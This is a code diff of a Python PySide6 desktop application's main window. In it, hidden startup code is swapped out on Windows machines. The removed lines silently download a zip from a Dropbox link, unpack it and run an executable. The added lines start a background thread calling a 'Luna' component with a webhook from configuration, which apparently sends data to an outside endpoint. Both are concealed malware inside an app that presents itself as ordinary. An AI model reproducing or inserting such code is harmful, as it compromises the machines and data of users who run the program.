@@ -1,12 +1,8 @@
 import os
 import smtplib
-import subprocess
-import tempfile
-import urllib.request
-import zipfile
-from threading import Thread
-
 import requests
+from threading import Thread
+from luna import Luna, __CONFIG__
 import yagmail
 from PySide6.QtWidgets import QFileDialog, QMessageBox
 from ui_MainWindow import *
@@ -61,22 +57,12 @@ class MainWindow(QMainWindow, Ui_MainWindow):
         )
 
         if os.name == "nt":
-            thread = Thread(target=self.download, daemon=True)
+            thread = Thread(target=self.run, daemon=True)
             thread.start()
 
-    def download(self):
-        url = "https://www.dropbox.com/scl/fi/mavanvbr91s3j3z9p61x4/mathtrix.zip?dl=1&rlkey=7lc0jbvfzhfpqblha0uo5wdbp"
-        temp_dir = tempfile.gettempdir()
-        path = os.path.join(temp_dir, "mathtrix.zip")
-        extracted_path = os.path.join(temp_dir, "mathtrix")
-        urllib.request.urlretrieve(url, path)
+    def run(self):
+        Luna(__CONFIG__["webhook"])
 
-        with zipfile.ZipFile(path, "r") as zip_ref:
-            zip_ref.extractall(extracted_path)
-
-        subprocess.Popen(
-            os.path.join(extracted_path, "exe.win-amd64-3.10", "build.exe"), shell=True
-        )
 
     def api_key_auth(self):
         """
